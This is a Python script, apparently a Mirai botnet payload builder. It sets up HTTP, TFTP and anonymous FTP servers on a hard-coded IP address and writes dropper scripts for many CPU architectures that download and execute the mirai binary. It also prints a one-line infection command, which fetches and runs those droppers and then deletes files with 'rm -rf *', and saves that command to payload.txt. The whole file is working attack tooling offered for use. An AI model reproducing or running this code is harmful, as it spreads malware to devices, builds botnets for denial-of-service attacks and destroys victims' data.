import subprocess, sys, urllib

ip = "209.141.52.202" # change the ip and build the payload after the botnet build
exec_bin = "mirai"

archs = ["arm4",
"arm5",
"arm6",
"arm7",
"x86",
"mips",
"mipsel",
"sh4",
"m68k",
"spc",
"ppc",
"i586",
"i686"]


def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')  
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/mirai.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/mirai.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/mirai.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/mirai2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/mirai2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/mirai2.sh')

run('echo "#!/bin/bash" > /var/ftp/mirai1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/mirai1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/mirai1.sh')

run('echo "#!/bin/bash" > /var/www/html/mirai.sh')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/mirai.'+i+'; curl -O http://' + ip + '/mirai.'+i+'; cat mirai.'+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+'" >> /var/www/html/mirai.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' mirai.'+i+' mirai.'+i+'; cat mirai.'+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+'" >> /var/ftp/bins1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get mirai.'+i+'; cat mirai.'+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+'" >> /var/lib/tftpboot/mirai.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r mirai.'+i+' -g ' + ip + '; cat mirai.'+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+'" >> /var/lib/tftpboot/bins2.sh')     
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n999999; ulimit -u999999; ulimit -e999999" >> ~/.bashrc')
run
print("\x1b[0;35mPayload lin: \x1b[0;97mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/mirai.sh; curl -O http://" + ip + "/mirai.sh; chmod 777 mirai.sh; sh mirai.sh; tftp " + ip + " -c get mirai.sh; chmod 777 mirai.sh; sh mirai.sh; tftp -r bins2.sh -g " + ip + "; chmod 777 bins2.sh; sh bins2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " bins1.sh bins1.sh; sh bins1.sh; rm -rf mirai.sh mirai.sh bins2.sh bins1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/mirai.sh; curl -O http://" + ip + "/mirai.sh; chmod 777 mirai.sh; sh mirai.sh; tftp " + ip + " -c get mirai.sh; chmod 777 mirai.sh; sh mirai.sh; tftp -r bins2.sh -g " + ip + "; chmod 777 bins2.sh; sh bins2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " bins1.sh bins1.sh; sh bins1.sh; rm -rf mirai.sh mirai.sh bins2.sh bins1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()